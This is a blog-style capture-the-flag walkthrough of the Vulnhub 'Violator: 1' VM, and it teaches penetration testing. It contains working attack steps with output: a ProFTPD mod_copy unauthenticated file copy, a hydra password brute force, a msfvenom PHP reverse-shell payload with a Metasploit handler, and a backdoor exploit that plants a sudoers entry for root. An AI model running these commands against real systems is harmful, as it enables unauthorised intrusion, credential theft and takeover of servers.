---
title: "Violator: 1, Vulnhub Walkthrough"
layout: post
category: writeup
tags: [vulnhub, hacking]
excerpt: "Walkthrough for Violator: 1 VM on Vulnhub"
---

 Before I begin, here's some hints given at the start of the vm:

 - Vince Clarke can help you with the Fast Fashion.
 - The challenge isn’t over with root. The flag is something special.
 - I have put a few trolls in, but only to sport with you.

# Get the IP and check for services

```
paul@archyoga [04:21:07] [~]
-> % nmap -sn 192.168.1.0/24 | grep violator
Nmap scan report for violator (192.168.1.108)
paul@archyoga [04:21:36] [~]
-> % nmap -p- -sV 192.168.1.108

Starting Nmap 7.12 ( https://nmap.org ) at 2016-07-09 16:21 EDT

Nmap scan report for violator (192.168.1.108)
Host is up (0.0086s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5rc3
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.49 seconds
```

So there's a website and an proFTPD v1.3.5rc3 server running on the machine. The website just says "I Say.. I say... I say boy! You're barkin up the wrong tree!" along with Foghorn Leghorn.

However, in the source I found this: ```<-- https://en.wikipedia.org/wiki/Violator_(album) -->```

I found an exploit through [http://exploit-db.com](http://exploit-db.com) for proFTPD 1.3.5 (CVE: 2015-3306) that allows you to copy files without logging into the server:

I wasn't sure what to copy, so I just copied anything I could by copying ```/proc/self/root``` to ```/var/www/html/root```, this making everything except the root user directory accessible:

```
paul@archyoga [04:49:25] [~]
-> % ftp 192.168.1.108
Connected to 192.168.1.108.
220 ProFTPD 1.3.5rc3 Server (Debian) [::ffff:192.168.1.108]
Name (192.168.1.108:paul):
331 Password required for paul
Password:
530 Login incorrect.
ftp: Login failed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> site cpfr /proc/self/root
350 File or directory exists, ready for destination name
ftp> site cpto /var/www/html/root
250 Copy successful
ftp>
```

Now you can easily see ```/etc/passwd```, all the home directories, and ```/etc/group``` to determine what to do next.

```
dg:x:1000:1000:Dave Gahan,,,:/home/dg:/bin/bash
proftpd:x:104:65534::/var/run/proftpd:/bin/false
ftp:x:105:65534::/srv/ftp:/bin/false
mg:x:1001:1001:Martin Gore:/home/mg:/bin/bash
af:x:1002:1002:Andrew Fletcher:/home/af:/bin/bash
aw:x:1003:1003:Alan Wilder:/home/aw:/bin/bash
```

Notice ```dg, mg, af, and aw```, who are all members of Depeche Mode, which was referenced in an initial hint. I spent quite some time traversing their home directories, however I didn't have enough information to do anything yet. I found instructions for a Wermache enigma machine and some other hints, but I still needed key. I'll come back to this part in more detail later.

# Get access to the server

In ```/etc/group```, I can see that user ```dg``` is a member of several groups, so let's try to crack that password:

The only possible solution I have for this is the link to the album for Violator.

```
paul@archyoga [06:13:59] [~]
-> % cewl "https://en.wikipedia.org/wiki/Violator_(album)" -m 6 -w passwords.txt
CeWL 5.1 Robin Wood (robin@digi.ninja) (http://digi.ninja)

paul@archyoga [06:23:38] [~]
-> % tr '[:upper:]' '[:lower:]' < passwords.txt > passwords1.txt

paul@archyoga [06:23:40] [~]
-> % sed -i "s/ //g" passwords1.txt

paul@archyoga [06:23:42] [~]
-> % hydra -t 1 -l dg -P ./passwords1.txt -vV 192.168.1.108 ftp
Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

...
[21][ftp] host: 192.168.1.108 login: dg password: policyoftruth
[STATUS] attack finished for 192.168.1.108 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```

First I used cewl to generate a password list based on the given url, then removed all the spaces and converted everything to lowercase using ```tr``` and ```sed```.

Now that I can actually create new files in the server, I generated a reverse php shell and used metasploit to get a shell on the machine:

```
paul@archyoga [11:03:11] [~]
-> % msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.109 LPORT=1337 R > exploit.php
fatal: Not a git repository (or any of the parent directories): .git
No platform was selected, choosing Msf::Module::Platform::PHP from the payload
No Arch selected, selecting Arch: php from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 949 bytes


paul@archyoga [11:03:15] [~]
-> % ftp 192.168.1.108                                                                     
Connected to 192.168.1.108.
220 ProFTPD 1.3.5rc3 Server (Debian) [::ffff:192.168.1.108]
Name (192.168.1.108:paul): dg
331 Password required for dg
Password:
230 User dg logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd /var/www/html/
250 CWD command successful
ftp> put exploit.php
200 PORT command successful
150 Opening BINARY mode data connection for exploit.php
226 Transfer complete
949 bytes sent in 6.8e-05 seconds (13.3 Mbytes/s)
ftp> 221 Goodbye.

paul@archyoga [11:04:14] [~]
-> % msfconsole

...
msf > use exploit/multi/handler
msf exploit(handler) > set lhost 192.168.1.109
lhost => 192.168.1.109
msf exploit(handler) > set lport 1337
lport => 1337
msf exploit(handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf exploit(handler) > exploit

[*] Started reverse TCP handler on 192.168.1.109:1337
[*] Starting the payload handler...
[*] Sending stage (33721 bytes) to 192.168.1.108
[*] Meterpreter session 1 opened (192.168.1.109:1337 -> 192.168.1.108:43369) at 2016-07-09 23:05:11 -0400
meterpreter > shell
Process 1314 created.
Channel 1 created.
python -c 'import pty;pty.spawn("/bin/sh")'
$ su dg
su dg
Password: policyoftruth

dg@violator:/var/www/html$
```

If you don't have much experience with metasploit (especially reverse shells), you should probably research that to get used to it.

# Getting Root

Now, back to the home directories, if you go to ```http://192.168.1.108/root/home``` there's 4 directories for each of the 4 suspicious users we saw earlier: ```af, aw, dg, mg```. The directory for af contains minarke, a terminal based enigma emulator, which is suprisingly difficult to use, aw contains a hint reading ```You are getting close... Can you crack the final enigma..?Y```, mg contains instructions for a Wermacht enigma machine, and dg contains a very small filesystem with proftpd isntalled.

Running ```sudo -l``` shows that user ```dg``` has permissions to run proftpd in this directory, however it only allows connections from 127.0.0.1. Once I ran it, I found out it is proftpd 1.3.3c.

```
dg@violator:/var/www/html$ sudo -l
sudo -l
Matching Defaults entries for dg on violator:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User dg may run the following commands on violator:
    (ALL) NOPASSWD: /home/dg/bd/sbin/proftpd
dg@violator:~/bd/sbin$ sudo /home/dg/bd/sbin/proftpd
sudo /home/dg/bd/sbin/proftpd
 - setting default address to 127.0.0.1
localhost - SocketBindTight in effect, ignoring DefaultServer
dg@violator:/var/www/html$ ftp localhost 2121
ftp localhost 2121
ftp: connect to address ::1: Connection refused
Trying 127.0.0.1...
Connected to localhost.
220 ProFTPD 1.3.3c Server (Depeche Mode Violator Server) [127.0.0.1]
```

Then I added a port forward through metasploit so I could access it on my local machine:

```
dg@violator:/var/www/html$ ^C
Terminate channel 0? [y/N]  N
[-] core_channel_interact: Operation failed: 1
meterpreter > portfwd add -L 127.0.0.1 -l 2121 -p 2121 -r 127.0.0.1
[*] Local TCP relay created: 127.0.0.1:2121 <-> 127.0.0.1:2121
meterpreter >
```

Now you can access the internal proftpd server v1.3.3c from your machine:

```
paul@archyoga [01:45:03] [~]
-> % telnet 127.0.0.1 2121
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
220 ProFTPD 1.3.3c Server (Depeche Mode Violator Server) [127.0.0.1]
user dg
331 Password required for dg
pass policyoftruth
230 User dg logged in
```

Now that I have metasploit port forwarding the ftp connection and I'm connected to it, I can use the exploit in proftpd 1.3.3c [https://www.exploit-db.com/exploits/15662/](https://www.exploit-db.com/exploits/15662/) with the metasploit module ```exploit/unix/ftp/proftpd_133c_backdoor``` along with the payload ```/cmd/unix/generic```

First in the using the shell I wrote ```dg ALL=(ALL:ALL)  ALL``` to ```/tmp/exploit``` since I'm using that to get root. Then I used the proftpd v1.3.3c exploit to actually copy it to the right directory:

```
msf > use exploit/unix/ftp/proftpd_133c_backdoor
msf exploit(proftpd_133c_backdoor) > set rhost 127.0.0.1
rhost => 127.0.0.1
msf exploit(proftpd_133c_backdoor) > set rport 2121
rport => 2121
msf exploit(proftpd_133c_backdoor) > set payload cmd/unix/generic
payload => cmd/unix/generic
msf exploit(proftpd_133c_backdoor) > set cmd chmod 0440 /tmp/exploit && cp /tmp/exploit /etc/sudoers.d
cmd => chmod 0440 /tmp/exploit && cp /tmp/exploit /etc/sudoers.d
msf exploit(proftpd_133c_backdoor) > exploit

[*] 127.0.0.1:2121 - Sending Backdoor Command
[*] Exploit completed, but no session was created.
```

```
dg@violator:/var/www/html$ sudo -l

...
User dg may run the following commands on violator:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /home/dg/bd/sbin/proftpd
dg@violator:/var/www/html$ sudo su
sudo su
[sudo] password for dg: policyoftruth

root@violator:/var/www/html# cd /root
cd /root
root@violator:~# ls
ls
flag.txt
root@violator:~# cat flag.txt
cat flag.txt
I say... I say... I say boy! Pumping for oil or something...?
---Foghorn Leghorn "A Broken Leghorn" 1950 (C) W.B.
```

And that get's us the flag! Now for the <i>final enigma</i>.

# The Final Enigma

Within the root folder there's also a suspicious directory ```.basildon``` containing ```crocs.rar```

```
root@violator:~# ls -a
ls -a
.  ..  .bash_history  .bashrc  .basildon  flag.txt  .profile
root@violator:~# cd .basildon
cd .basildon
root@violator:~/.basildon# ls -a
ls -a
.  ..  crocs.rar
root@violator:~/.basildon# cp crocs.rar /var/www/html/
cp crocs.rar /var/www/html/
```

Back on my local machine, I can see the contents of crocs.rar are password protected

```
paul@archyoga [02:17:20] [~/Downloads]
-> % unrar e crocs.rar

...
Enter password (will not be echoed) for artwork.jpg:
```

I tried using the password list from eariler, but that didn't work so I did some googling about crocs and Depeche Mode and found out it is a night club they play at, so I added songs from that to the list and tried it again, and that didn't work either. I wasn't sure what else to try, so I regenerated the password list except didn't take any spaces out or change anything to lowercase, and sure enough it worked!

```
paul@archyoga [02:21:49] [~/Downloads]
-> % rar2john crocs.rar > myhash
paul@archyoga [02:25:11] [~/Downloads]
-> % rar2john myhash --wordlist=~/passwords4.txt   
Using default input encoding: UTF-8
Loaded 1 password hash (rar, RAR3 [SHA1 AES 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
World in My Eyes (crocs.rar)
```

Inside ```crocs.rar``` there's just some album artwork, but running exiftool on it reveals a very suspicoius copyright and rights message:

```
UKSNRSPYLEWHKOKZARVKDEINRLIBWIUCFQRQKAQQGQ
LTIUCYMFENULUVFOYQDKPHSUJHFUJSAYJDFGDFRYWK
LSVNJNVDVSBIBFNIFASOPFDVEYEBQYCOGULLLVQPUW
ISDBNLNQIJUEZACAKTPPSBBLWRHKZBJMSKLJOACGJM
FVXZUEKBVWNKWEKVKDMUYFLZEOXCIXIUHJOVSZXFLO
ZFQTNSKXVWUHJLRAEERYTDPVNZPGUIMXZMESMAMBDV
KFZSDEIQXYLJNKTBDSRYLDPPOIVUMZDFZPEWPPVHGP
FBEERMDNHFIWLSHZYKOZVZYNEXGPROHLMRHFEIVIIA
TOAOJAOVYFVBVIYBGUZXXWFKGJCYEWNQFTPAGLNLHV
CRDLFHSXHVMCERQTZOOZARBEBWCBCIKUOFQIGZPCMW
RHJEMUSGYBGWXJENRZHZ
```

I'm guessing this is the key for the enigma referenced in the home directories earlier.

Using the instructions from the ```mg``` home folder I decrypted the code using [http://www.dcode.fr/enigma-machine-cipher](http://www.dcode.fr/enigma-machine-cipher) since the given minarke emulator was confusing to use.

```
Lyrics:

* Use Wermacht with 3 rotors
* Reflector to B
Initial: A B C
Alphabet Ring: C B A
Plug Board A-B, C-D

```
<br>

```
ONE FINAL CHALLENGE FOR YOU BGHX CONGRATULATIONS FOR
THE FOURTH TIME ON SNARFING THE FLAG ON VIOLATOR ILL
PRESUME BY NOW YOULL KNOW WHAT I WAS LISTENING TO WHEN
CREATING THIS CTF I HAVE INCLUDED THINGS WHICH WERE
DELIBERATLY AVOIDING THE OBVIOUS ROUTE IN TO KEEP YOU ON
YOUR TOES ANOTHER THOUGHT TO PONDER IS THAT BY ABUSING
PERMISSIONS YOU ARE ALSO BY DEFINITION A VIOLATOR
SHOUTOUTS AGAIN TO VULNHUB FOR HOSTING A GREAT LEARNING
TOOL A SPECIAL THANKS GOES TO BENR AND GKNSB FOR TESTING
AND TO GTMLK FOR THE OFFER TO HOST THE CTF AGAIN
```

There you go!
